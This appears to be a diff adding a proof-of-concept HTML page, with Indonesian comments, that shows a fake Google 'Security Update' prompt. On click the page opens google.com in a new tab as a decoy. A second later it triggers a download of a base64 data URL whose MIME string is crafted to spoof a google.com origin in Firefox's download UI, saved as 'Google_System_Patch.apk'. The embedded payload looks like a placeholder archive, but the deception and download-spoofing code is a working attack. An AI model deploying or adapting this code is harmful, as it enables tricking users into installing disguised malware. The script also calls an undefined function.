@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Firefox Security Research - Timed Spoof</title>
+    <style>
+        body { font-family: sans-serif; background: #121212; color: white; text-align: center; padding: 50px 20px; }
+        .card { background: #1e1e1e; border-radius: 15px; padding: 30px; max-width: 400px; margin: auto; border: 1px solid #333; }
+        .btn-exploit { 
+            background: #ffffff; color: black; width: 100%; padding: 18px; 
+            border: none; border-radius: 10px; cursor: pointer; font-weight: bold; 
+        }
+        #status { margin-top: 20px; color: #ffd740; font-family: monospace; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <h2>Security Update</h2>
+        <p>Situs ini akan membuka portal resmi Google untuk verifikasi.</p>
+        <button class="btn-exploit" onclick="runAttack()">Mulai Update</button>
+        <div id="status">Status: Ready</div>
+    </div>
+
+    <script>
+        function runAttack() {
+            const status = document.getElementById('status');
+            
+            // 1. Payload & Spoofing URL
+            const apkPayload = "UEsDBBQAAAAIAAAAAAAAAAAAAAAAAAAAAAAACQAAAGhlbGxvLnR4dFV0RAsAA2SjdWZko3VmdXgLAAEE6AMAAAToAwAAUEsBAhQDFAAAAAgAAAAAAAAAAAAAAAAAAAAAAAkAAAAAAAAAAAAAAAAAAAAAaGVsbG8udHh0VXRFAANZp3VmdKd1ZnV4CwABBOgDAAAE6AMAAFBLBQYAAAAAAQABAEUAAABZAAAAAAA=";
+            const finalURL = `data:application/vnd.android.package-archive;/\\\\\\/.google.com/application/x-msdownload;base64,${apkPayload}`;
+
+            // 2. Buka Google di Tab Baru (Decoy)
+            // Ini akan membuat pengguna fokus ke tab Google yang sedang loading
+            status.innerText = "Status: Opening Google.com...";
+            const googleWin = window.open("https://www.google.com", "_blank");
+
+            // 3. TUNGGU 1 DETIK (Logika yang kamu inginkan)
+            // Eksekusi tetap dilakukan oleh halaman ini (latar belakang)
+            setTimeout(() => {
+                status.innerText = "Status: Triggering spoofed download...";
+                
+                const a = document.createElement("a");
+                a.href = finalURL;
+                a.download = "Google_System_Patch.apk";
+                document.body.appendChild(a);
+                
+                // Menembakkan unduhan
+                a.click();
+                document.body.removeChild(a);
+                
+                updateLog("Download sent to Firefox UI.");
+            }, 1000); // Jeda 1 detik
+        }
+    </script>
+</body>
+</html>
